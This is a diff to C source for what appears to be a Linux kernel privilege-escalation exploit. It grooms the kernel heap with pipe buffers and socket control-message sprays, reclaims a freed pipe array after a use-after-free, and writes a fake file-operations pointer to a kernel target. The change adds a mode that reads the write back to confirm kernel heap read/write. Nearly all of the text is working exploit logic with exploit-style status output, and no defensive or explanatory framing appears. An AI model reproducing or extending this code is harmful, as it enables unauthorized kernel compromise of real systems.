@@ -43,7 +43,8 @@ static int aligned_slide(uint64_t value, uint64_t base)
         (slide & (T870_P0_ALIGNMENT - 1U)) == 0U;
 }
 
-static int validate_inputs(const struct t870_bridge_inputs *inputs)
+static int validate_inputs(const struct t870_bridge_inputs *inputs,
+                           int heap_rw_checkpoint)
 {
     uint64_t direct_delta;
     uint64_t expected_page;
@@ -55,13 +56,19 @@ static int validate_inputs(const struct t870_bridge_inputs *inputs)
     if (inputs->fake_fops != inputs->payload_base -
         T870_SKB_DATA_BACKSHIFT + T870_FOPS_TABLE_OFF)
         return 0;
-    if (!aligned_slide(inputs->misc_fops_direct,
-                       T870_STATIC_MISC_FOPS_DIRECT) ||
-        (inputs->misc_fops_direct & 0xfffU) != 0x1e8U)
-        return 0;
     if (!aligned_slide(inputs->anon_pipe_buf_ops,
                        T870_STATIC_ANON_PIPE_BUF_OPS))
         return 0;
+    if (heap_rw_checkpoint) {
+        if (inputs->misc_fops_direct < inputs->payload_base ||
+            inputs->misc_fops_direct + sizeof(uint64_t) >
+                inputs->payload_base + T870_ORDER3_SIZE)
+            return 0;
+    } else if (!aligned_slide(inputs->misc_fops_direct,
+                              T870_STATIC_MISC_FOPS_DIRECT) ||
+               (inputs->misc_fops_direct & 0xfffU) != 0x1e8U) {
+        return 0;
+    }
 
     direct_delta = inputs->misc_fops_direct - T870_DIRECT_MAP_BASE;
     expected_page = T870_VMEMMAP_START +
@@ -103,15 +110,18 @@ int t870_bridge_worker(void *opaque)
     struct t870_bridge_resources *resources;
     unsigned char safe_map[T870_CMSG_CONTROL_SIZE];
     unsigned char pipe_write[T870_CMSG_CONTROL_SIZE];
+    uint64_t heap_readback = 0;
     unsigned int reclaimed_pipe = 0;
     unsigned int count;
     int matches;
     int arm_result;
 
-    if (context == NULL || !validate_inputs(&context->inputs) ||
+    if (context == NULL ||
+        !validate_inputs(&context->inputs, context->heap_rw_checkpoint) ||
         context->hooks.arm_stale_map == NULL ||
         context->hooks.release_stale_map == NULL ||
-        context->hooks.verify_original_route == NULL) {
+        (!context->heap_rw_checkpoint &&
+         context->hooks.verify_original_route == NULL)) {
         fprintf(stderr, "[-] bridge input contract rejected\n");
         return EINVAL;
     }
@@ -163,6 +173,14 @@ int t870_bridge_worker(void *opaque)
     if (count != T870_PIPE_WAVE_COUNT)
         return dirty_failure(context, "pipe-populate");
 
+    if (context->heap_rw_checkpoint) {
+        count = t870_pipe_wave_drain_prefix(&resources->pipes, 2U);
+        printf("[*] bridge pipe prefix drained=%u/%u curbuf=2 nrbufs=1\n",
+               count, T870_PIPE_WAVE_COUNT);
+        if (count != T870_PIPE_WAVE_COUNT)
+            return dirty_failure(context, "pipe-prefix-drain");
+    }
+
     /* Delayed sock_kfree_s now frees the one live replacement pipe array. */
     t870_cmsg_wave_release(&resources->first);
     resources->first_prepared = 0;
@@ -173,11 +191,16 @@ int t870_bridge_worker(void *opaque)
     if (count != T870_CMSG_WAVE_SENDERS)
         return dirty_failure(context, "second-wave");
 
-    matches = t870_pipe_wave_find_zero_length(
-        &resources->pipes, &reclaimed_pipe);
+    if (context->heap_rw_checkpoint)
+        matches = t870_pipe_wave_find_zero_length_after_drain(
+            &resources->pipes, &reclaimed_pipe);
+    else
+        matches = t870_pipe_wave_find_zero_length(
+            &resources->pipes, &reclaimed_pipe);
     printf("[*] bridge second reclaim FIONREAD matches=%d expected=1 "
            "candidate=%u normal_bytes=%u\n", matches, reclaimed_pipe,
-           3U * T870_PIPE_WAVE_PAGE_SIZE);
+           (context->heap_rw_checkpoint ? 1U : 3U) *
+               T870_PIPE_WAVE_PAGE_SIZE);
     if (matches != 1)
         return dirty_failure(context, "second-reclaim-checkpoint");
 
@@ -185,9 +208,22 @@ int t870_bridge_worker(void *opaque)
             &resources->pipes, reclaimed_pipe, &context->inputs.fake_fops,
             sizeof(context->inputs.fake_fops)) != 0)
         return dirty_failure(context, "target-write");
-    printf("[*] bridge fake-fops write pipe=%u target=%016" PRIx64
+    printf("[*] bridge target write pipe=%u target=%016" PRIx64
            " value=%016" PRIx64 "\n", reclaimed_pipe,
            context->inputs.misc_fops_direct, context->inputs.fake_fops);
+
+    if (context->heap_rw_checkpoint) {
+        if (t870_pipe_wave_read_one(
+                &resources->pipes, reclaimed_pipe, &heap_readback,
+                sizeof(heap_readback)) != 0)
+            return dirty_failure(context, "heap-readback");
+        if (heap_readback != context->inputs.fake_fops)
+            return dirty_failure(context, "heap-readback-mismatch");
+        printf("[+] bridge heap read/write verified target=%016" PRIx64
+               " value=%016" PRIx64 "; owner resources retained\n",
+               context->inputs.misc_fops_direct, heap_readback);
+        return 0;
+    }
 
     if (!context->hooks.verify_original_route(context->hooks.opaque))
         return dirty_failure(context, "original-route-verification");
